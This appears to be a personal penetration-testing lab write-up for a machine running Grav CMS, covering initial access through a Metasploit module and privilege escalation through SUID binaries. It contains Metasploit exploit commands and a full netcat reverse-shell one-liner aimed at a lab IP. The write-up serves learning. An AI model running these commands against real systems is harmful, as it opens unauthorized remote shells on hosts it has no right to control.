## 2. Enumeration / Initial Foothold.

Hmm Grav. I've never heard of it.

Since no DNS services or hostname provided, subdomain/vhost enumeration is not possible.
While enumerating the subdirectories, quick search for CVE:

So there is a metasploit module, always worth trying it.

I basically tuned some options for exploit to fit our target, but it dropped a shell.
```

msf6 exploit(linux/http/gravcms_exec) > set RHOSTS 192.168.216.12
RHOSTS => 192.168.216.12
msf6 exploit(linux/http/gravcms_exec) > set LHOST 192.168.45.154
LHOST => 192.168.45.154
msf6 exploit(linux/http/gravcms_exec) > set LPORT 80
LPORT => 80
msf6 exploit(linux/http/gravcms_exec) > set TARGETURI /grav-admin
TARGETURI => /grav-admin
msf6 exploit(linux/http/gravcms_exec) > exploit

```
And the subdirectory enumeration didn't give me anything meaningful:

```

Since this shell is instable as hell, I quickly created a revshell with:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.241 443 >/tmp/f
```

## 3. PrivEsc

I found that sudo version is 1.8.31.
The first things I do during privesc is: sudo -l, kernel exploit, sudo exploit and suid, sgid binaries.

Next thing:

![image](../contentImages/astronaut/5.png)

And we got:

![image](../contentImages/astronaut/6.png)

So maybe:

![image](../contentImages/astronaut/7.png)

Done

New things learned: look into suid binaries and gtfobins more carefully, what does "it doesn't drop the privielged shell" means? Does it mean that the binary is completely useless?

- hint : think about SUID context.
